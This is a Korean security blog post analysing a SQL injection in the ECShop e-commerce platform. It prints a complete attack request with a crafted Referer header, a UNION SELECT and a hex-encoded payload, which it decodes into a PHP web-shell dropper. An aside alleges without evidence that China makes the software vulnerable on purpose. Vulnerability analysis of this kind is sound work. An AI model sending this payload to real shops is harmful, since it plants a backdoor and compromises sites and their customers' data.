---
layout: post
title: '[위협] ECShop_SQL_Injection'
subtitle: 'threat, ecshop, sql injection'
categories: threat
tags: application
comments: true
---

> 이 글은 어플리케이션 취약점을 분석한 글입니다. 

# ECShop_SQL_Injection

ECShop은 전자 상거래 플랫폼 구축 소프트웨어, 쉽게 표현하면 인터넷 쇼핑몰의 틀을 제공해주는 오픈소스 플랫폼입니다.<br>
ZoomEye사이트에서 검색해본 결과 아이러니하게도 미국에서 제일 많이 쓰이고 있습니다.

> 중국에서 만들어진 웹 프레임워크인데... 중국은 본인들이 만들고 본인들이 공격하기를 좋아하는 것 같다. 일부러 취약하게 만드는 걸 수도...

## 실제 공격 구문

```xml
GET /user.php?act=login HTTP/1.1 또는 /fdgq.php
Connection: Keep-Alive
Accept: */*
Referer=554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1. 0x272f2a.
3. 4. 5. 6. 7. 8. 0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a5639
7764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676B5831
4250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878
```

각각의 부분을 살펴보면 user.php의 act 파라미터에 login 값을 전달할 경우 referer에 있는 값이 전달됩니다.<br>
554fcae493e564ee0dc75bdf2ebf94ca ads는 문자열을 자르기 위한 hash 값으로, 이후 lib_insert.php의 insert_ads() 함수를 호출하기 위해 사용됩니다. 

|a:2:{s:3:"num";s:280:"*/ 는 배열을 임의의 값으로 채우고 주석처리하는 역할, 이후 union select 구문을 사용하여 SQL Injection을 진행합니다. 

UNION 구문안에 존재하는 값 중 2,9 컬럼을 제외한 나머지 컬럼은 컬럼의 수를 맞추기 위해 임의의 값을 입력했고,

2번째 컬럼(0x272f2a)은 ' /* 문자열로 뒷부분을 주석처리를 하기 위해서 사용합니다. 

9번째 컬럼에서
```bash
0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756
447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676B58314250553152625a563070
4f79412f506d4669597963702729293b2f2f7d787878
```
는 {$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJ2QucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbZV0pOyA/PmFiYycp'));//}xxx 문자열로<br>
base64로 암호회된 문자열이 디코딩 되는지 확인(assert,디버깅) 하기위해서 사용하는 구문입니다. (assert()대신에 php_info()쓰는 경우도 존재)

***해당 구문을 디코딩하면 file_put_contents('d.php','<?php eval($_POST[e]); ?>abc') 라는 구문이 나옵니다.***
